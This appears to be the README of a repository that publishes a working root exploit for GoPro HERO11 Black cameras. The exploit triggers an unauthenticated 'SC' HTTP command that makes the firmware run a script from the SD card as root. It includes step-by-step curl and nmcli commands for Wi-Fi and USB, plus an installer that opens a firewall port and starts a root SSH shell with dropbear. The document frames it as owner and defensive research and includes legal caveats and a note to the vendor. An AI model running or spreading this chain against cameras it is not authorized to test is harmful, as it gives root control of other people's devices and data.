# GoPro HERO11 Black — `SC` root

Root code execution on a GoPro HERO11 Black running **H22.01.02.20.00**, using
only the camera's own HTTP server. No firmware flashing, no memory corruption,
no USB exploit.

> **Use this only on a camera you own.** The trigger is only reachable on the
> camera's own Wi-Fi AP or its USB network gadget, so it needs physical control
> of the camera — but that does not make it okay to run against someone else's
> device. See [Legal](#legal).

## What it does

```
GET /gp/gpCamera?cmd=SC&p=%02
   -> gpHttpServer (port 80, unauthenticated)
   -> gpNet mailbox  (/to_gpnet, TLV type 2)
   -> BP command "SC" -> handler RTsetSC @ 0x41d888
   -> system("/tmp/fuse_d/scheduled_capture.sh&")  as root
```

`/tmp/fuse_d` is the mounted SD card. `scheduled_capture.sh` is a script you put
at the card root; the firmware contains the path as a hardcoded string and runs
it when it receives the `SC` command with payload byte `0x02`.

The marker from a successful run:

```
uid:   uid=0(root) gid=0(root)
uname: Linux gopro 4.19.124 #1 SMP PREEMPT ... aarch64 GNU/Linux
ppid:  /sbin/finit
```

## Requirements

- GoPro HERO11 Black on firmware **H22.01.02.20.00** (tested). The same `SC`
  hook is present in the official firmware of the HERO8 Black through the
  HERO13 Black / MAX2 generation; the newest MISSION 1 family gates it. See
  [`docs/firmware-verification.md`](docs/firmware-verification.md). The command
  table index and the Wi-Fi/USB addresses can differ between bodies, and a
  wrong command can make `gpNet` unhappy until it restarts.
- An SD card with `scheduled_capture.sh` at its root.
- A network path to the camera's HTTP server (port 80):
  - **Wi-Fi AP** — verified. Enable wireless on the camera, join its AP; the
    camera is `10.5.5.9`. You need the camera's Wi-Fi password (shown on the
    camera when you enable wireless).
  - **USB NCM** — verified. The same server at `172.23.148.51`; the camera
    enumerates as USB ethernet gadget `2672:0059` and never answers ICMP.
- `curl` on the host.

## Quick start — Wi-Fi (verified)

1. Copy the payload to the card root:

   ```bash
   cp payloads/scheduled_capture.sh /media/$USER/<CARD>/scheduled_capture.sh
   ```

2. Put the card in the camera and enable wireless on it
   (Preferences → Connections → Wireless Connections). Note the AP name and
   password.

3. Join the camera AP from the host and confirm the server:

   ```bash
   curl -s http://10.5.5.9/gp/gpControl/info
   ```

4. Fire the command:

   ```bash
   ./root-sc.sh
   # GET http://10.5.5.9/gp/gpCamera?cmd=SC&p=%02
   # curl exit=0 http=200 bytes=1 body=00
   ```

5. Verify: `/ROOTED.txt` at the card root (see [Verify](#verify)).

## Quick start — USB NCM (verified)

1. Same card payload.
2. Plug the camera in over USB; it enumerates as a CDC-NCM ethernet gadget
   (plus MTP) as USB `2672:0059`.
3. Give the host an address on the camera's subnet. The kernel names the
   interface `enx<mac>` and **the gadget MAC is regenerated on every plug**, so
   select the interface by USB vendor id, not by name:

   ```bash
   ./scripts/usb-up.sh
   # camera interface: enx7e3ca05ac029
   #   enx7e3ca05ac029  UP  172.23.148.52/24
   # OK: 172.23.148.51:80 answered 200 (firmware H22.01.02.20.00)
   ```

   The script drives NetworkManager (`ipv4.never-default`, so no default route
   is touched) and needs no root. By hand, the equivalent is:

   ```bash
   nmcli connection add type ethernet ifname <enx...> con-name gopro-usb \
       ipv4.method manual ipv4.addresses 172.23.148.52/24 \
       ipv4.never-default yes ipv6.method ignore
   nmcli connection up gopro-usb
   ```

   If the camera re-enumerates mid-session the interface name changes; re-point
   the profile (`nmcli connection modify gopro-usb connection.interface-name
   <new-enx...>`) and bring it up again. `scripts/usb-up.sh` does this each run.

4. Fire it, with the USB address:

   ```bash
   ./root-sc.sh http://172.23.148.51
   ```

   Note: USB and Wi-Fi are mutually exclusive on this camera; BLE turns off
   while USB is connected. `ping` fails even on a healthy link — probe over TCP.

## Verify

The card root is authoritative: `/ROOTED.txt`. The default payload does not
reboot the camera, and the camera builds its media index at boot and refreshes
it on its own schedule, so the `DCIM` copy may **not** show up in the media
list until the camera rescans or restarts:

```bash
curl -s http://10.5.5.9:8080/gopro/media/list       | grep -o ROOTED.TXT   # Wi-Fi
curl -s http://172.23.148.51:8080/gopro/media/list  | grep -o ROOTED.TXT   # USB
```

Treat the card as the source of truth. The media list is a convenience when it
does appear — its absence is not evidence that the payload did not run.

## What the payload does

The bundled payload is deliberately boring: it writes `uid`, `uname`, `date`
and `pwd` to `/ROOTED.txt`, copies that to `DCIM/100GOPRO/ROOTED.TXT`, and
stops. It does not persist, does not change settings, and does not reboot.

Edit it if you want more. It runs as root with `/bin/sh` from `/`, so use
absolute paths. A reboot line is included but commented out.

## Root shell over SSH (dropbear) — verified

The same `SC` trigger turns the proof-of-root into an interactive, key-only
root shell on port 22. Inbound is DROP, so the installer opens exactly one port
first — the same `iptables -I INPUT 1 …` pattern gpNet uses for its own TFTP
port.

```bash
./scripts/install-card.sh /media/$USER/<CARD> ~/.ssh/id_ed25519.pub
```

That writes five files to the card root:

| file | purpose |
|---|---|
| `scheduled_capture.sh` | bootstrap, run by gpNet on `SC` |
| `stage.sh` | the installer (fetched fresh from the host first) |
| `dropbearmulti` | static musl aarch64 Dropbear 2026.94, 396 KB |
| `authorized_keys` | the operator public key |
| `dropbear_hostkey` | stable server identity, generated once per card |

Then, with the card in the camera and USB attached:

```bash
./scripts/arm.sh
# ...
# uid=0(root) gid=0(root) groups=0(root)
# 4.19.124
```

`arm.sh` starts a temporary HTTP server, sends the trigger, waits for the port
and checks the login. Run it again after every camera power cycle: **the rootfs
is mounted read-only** (`/dev/root / ext4 ro`), so there is nothing to persist
and nothing can auto-start at boot.

The binary is served from this checkout, so `stage.sh` edits take effect on
the next re-arm without touching the card. How it works — the firewall, the
`authorized_keys` permission traps (1777 tmpfs, gpNet's umask 0), and how to
diagnose a failed install without pulling the card — is in
[`docs/dropbear.md`](docs/dropbear.md).

## Troubleshooting

| Symptom | Meaning |
|---|---|
| `http=200 bytes=1 body=00` | gpNet accepted `SC`. If no marker appeared, the file was missing/unreadable at `/tmp/fuse_d/scheduled_capture.sh`. |
| `500 Server error: RX timeout.` (after 10 s) | gpNet did not reply. Wrong command or payload length; `gpNet` usually recovers. `S4` is a *different* command that needs an 11–40 byte payload — sending it 1 byte is a good way to provoke this. |
| `404` / `Error 404` | Wrong path; it is `/gp/gpCamera` on port 80, not 8080. |
| Marker on the card but not in `/gopro/media/list` | Stale media index — this payload does not reboot. Not a failure. |
| `lsusb` loses `2672:0059`, the `enx…` interface vanishes | The camera re-enumerated or rebooted (new gadget MAC). Re-run `scripts/usb-up.sh` when it is back. |
| SSH: `Permission denied (publickey)` with the right key | A directory above `authorized_keys` is group/world-writable, so dropbear refuses it. See `docs/dropbear.md` §3 — the usual cause is a 0777 dir from gpNet's umask. |
| Port 22 refused after a trigger | The installer failed before starting dropbear. Read the `/beacon/…` lines in the host HTTP access log, or `/tmp/fuse_d/DROPBEAR_LOG.txt` on the card. |
| SSH worked, then stopped after a power cycle | Expected — the rootfs is read-only. Re-arm with `./scripts/arm.sh`. |
| Camera AP not visible | Wireless is off, or USB is connected (USB disables Wi-Fi/BLE). Enable wireless on the camera. |
| Camera unreachable after success | The payload may have rebooted it; the AP is off after a reboot until wireless is enabled again. |

## How it works

The full chain, the HERO11 66-entry command table decode (`SC` is entry 63),
the handler's three payload branches and the reverse-engineering notes are in
[`docs/how-it-works.md`](docs/how-it-works.md). The `SC` index and handler
address differ on other models; see
[`docs/firmware-verification.md`](docs/firmware-verification.md).

Short version: `SC` is a test hook for the camera's scheduled-capture feature.
Payload `0x01` ("Allow Scheduled Capture") sets the feature bit that gates the
normal wake path, and `0x02` ("Start Scheduled Capture") runs the card script
**without** checking that bit. The command is reachable through the
unauthenticated legacy HTTP proxy.

## Tested on

- HERO11 Black, firmware `H22.01.02.20.00` (retail): Wi-Fi path, verified.
  Marker written with `uid=0(root)`, `ppid=/sbin/finit`.
- Same camera, same build, over **USB NCM**: `SC` accepted
  (`http=200 bytes=1 body=00`) and `ROOTED.txt` written to the card root.
- Static, from the current official images: HERO8 Black `02.51.00`, HERO9 Black
  `01.72.00`, HERO10 Black `01.62.00`, HERO11 Black `02.32.00`, HERO11 Black
  Mini `02.50.00`, HERO12 Black `02.44.00`, HERO13 Black `02.14.00`, MAX
  `02.06.00` and MAX2 `01.34.00` all contain the same `SC` → `system()` path.
  MISSION 1 `04.01.00` has the command but a production-build gate; HERO (2024)
  and LIT HERO use an Ambarella image with no gpNet in the readable rootfs.
  Details: [`docs/firmware-verification.md`](docs/firmware-verification.md).

## Cleanup

- Delete `scheduled_capture.sh` and `ROOTED.txt` from the card, and
  `DCIM/100GOPRO/ROOTED.TXT`.
- Nothing was installed on the camera by the default payload; a reboot is enough.

## Legal

This is a logic flaw in firmware you own, published for owners of the same
device and for defensive research. Run it only against hardware you own or are
explicitly authorized to test. Do not use it to access a device or data that is
not yours. Depending on where you live, circumventing device protections can
have legal consequences even on hardware you own; check your local law. The
code is provided as-is, with no warranty and no liability.

If you are GoPro: this is a design issue, not a memory-safety bug — a debug/test
hook that executes a file from removable storage, reachable through the
unauthenticated legacy HTTP API. It is worth a look.
